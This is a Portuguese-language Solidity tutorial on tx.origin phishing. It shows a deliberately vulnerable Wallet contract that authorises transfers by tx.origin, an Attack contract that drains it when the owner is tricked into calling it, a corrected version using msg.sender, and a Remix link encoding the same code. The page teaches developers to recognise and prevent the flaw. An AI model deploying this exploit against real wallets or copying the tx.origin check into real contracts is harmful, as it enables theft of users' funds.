# Phishing com tx.origin

### Qual é a diferença entre `msg.sender` e `tx.origin`?

Se o contrato A chama o B, e B chama C, em C `msg.sender` é B e `tx.origin` é A.

</h4><a href="#vulnerability" id="vulnerability">Vulnerabilidade</a></h4>

Um contrato malicioso pode enganar o proprietário de um contrato para chamar uma função que somente o proprietário deveria poder chamar.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Carteira é um contrato simples em que somente o proprietário deve ser capaz de
transferir Ether para outro endereço. Wallet.transfer() usa tx.origin para confirmar
 que quem chama é o proprietário. Vamos ver como podemos hackear esse contrato
*/

/*
1. Alice implanta Wallet com 10 Ether
2. Eve implanta Attack com o endereço do contrato da Wallet de Alice.
3. Eve engana Alice com uma chamada Attack.attack()
4. Eve rouba com êxito Ether da carteira da Alice

O que aconteceu?
Alice foi enganada com uma chamada Attack.attack(). Dentro de Attack.attack(),
foi solicitada uma transferência de todos os fundos da carteira da Alice
para o endereço da Eve. Já que tx.origin na Wallet.transfer() é igual ao
do endereço da Alice, a transferência foi autorizada. A carteira transferiu
todo Ether para Eve.
*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
```

</h4><a href="#preventative-techniques" id="preventative-techniques">Técnicas preventivas</a></h4>

Use `msg.sender` ao invés de `tx.origin`

```solidity
function transfer(address payable _to, uint256 _amount) public {
  require(msg.sender == owner, "Not owner");

  (bool sent, ) = _to.call{ value: _amount }("");
  require(sent, "Failed to send Ether");
}
```

## Teste no Remix

- [TxOrigin.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xMzsKCi8qCkNhcnRlaXJhIGUgdW0gY29udHJhdG8gc2ltcGxlcyBlbSBxdWUgc29tZW50ZSBvIHByb3ByaWV0YXJpbyBkZXZlIHNlciBjYXBheiBkZQp0cmFuc2ZlcmlyIEV0aGVyIHBhcmEgb3V0cm8gZW5kZXJlY28uIFdhbGxldC50cmFuc2ZlcigpIHVzYSB0eC5vcmlnaW4gcGFyYSBjb25maXJtYXIKIHF1ZSBxdWVtIGNoYW1hIGUgbyBwcm9wcmlldGFyaW8uIFZhbW9zIHZlciBjb21vIHBvZGVtb3MgaGFja2VhciBlc3NlIGNvbnRyYXRvCiovCgovKgoxLiBBbGljZSBpbXBsYW50YSBXYWxsZXQgY29tIDEwIEV0aGVyCjIuIEV2ZSBpbXBsYW50YSBBdHRhY2sgY29tIG8gZW5kZXJlY28gZG8gY29udHJhdG8gZGEgV2FsbGV0IGRlIEFsaWNlLgozLiBFdmUgZW5nYW5hIEFsaWNlIGNvbSB1bWEgY2hhbWFkYSBBdHRhY2suYXR0YWNrKCkKNC4gRXZlIHJvdWJhIGNvbSBleGl0byBFdGhlciBkYSBjYXJ0ZWlyYSBkYSBBbGljZQoKTyBxdWUgYWNvbnRlY2V1PwpBbGljZSBmb2kgZW5nYW5hZGEgY29tIHVtYSBjaGFtYWRhIEF0dGFjay5hdHRhY2soKS4gRGVudHJvIGRlIEF0dGFjay5hdHRhY2soKSwKZm9pIHNvbGljaXRhZGEgdW1hIHRyYW5zZmVyZW5jaWEgZGUgdG9kb3Mgb3MgZnVuZG9zIGRhIGNhcnRlaXJhIGRhIEFsaWNlCnBhcmEgbyBlbmRlcmVjbyBkYSBFdmUuIEphIHF1ZSB0eC5vcmlnaW4gbmEgV2FsbGV0LnRyYW5zZmVyKCkgZSBpZ3VhbCBhbwpkbyBlbmRlcmVjbyBkYSBBbGljZSwgYSB0cmFuc2ZlcmVuY2lhIGZvaSBhdXRvcml6YWRhLiBBIGNhcnRlaXJhIHRyYW5zZmVyaXUKdG9kbyBFdGhlciBwYXJhIEV2ZS4KKi8KCmNvbnRyYWN0IFdhbGxldCB7CiAgICBhZGRyZXNzIHB1YmxpYyBvd25lcjsKCiAgICBjb25zdHJ1Y3RvcigpIHBheWFibGUgewogICAgICAgIG93bmVyID0gbXNnLnNlbmRlcjsKICAgIH0KCiAgICBmdW5jdGlvbiB0cmFuc2ZlcihhZGRyZXNzIHBheWFibGUgX3RvLCB1aW50IF9hbW91bnQpIHB1YmxpYyB7CiAgICAgICAgcmVxdWlyZSh0eC5vcmlnaW4gPT0gb3duZXIsICJOb3Qgb3duZXIiKTsKCiAgICAgICAgKGJvb2wgc2VudCwgKSA9IF90by5jYWxse3ZhbHVlOiBfYW1vdW50fSgiIik7CiAgICAgICAgcmVxdWlyZShzZW50LCAiRmFpbGVkIHRvIHNlbmQgRXRoZXIiKTsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIGFkZHJlc3MgcGF5YWJsZSBwdWJsaWMgb3duZXI7CiAgICBXYWxsZXQgd2FsbGV0OwoKICAgIGNvbnN0cnVjdG9yKFdhbGxldCBfd2FsbGV0KSB7CiAgICAgICAgd2FsbGV0ID0gV2FsbGV0KF93YWxsZXQpOwogICAgICAgIG93bmVyID0gcGF5YWJsZShtc2cuc2VuZGVyKTsKICAgIH0KCiAgICBmdW5jdGlvbiBhdHRhY2soKSBwdWJsaWMgewogICAgICAgIHdhbGxldC50cmFuc2Zlcihvd25lciwgYWRkcmVzcyh3YWxsZXQpLmJhbGFuY2UpOwogICAgfQp9&version=soljson-v0.8.13+commit.abaa5c0e.js)
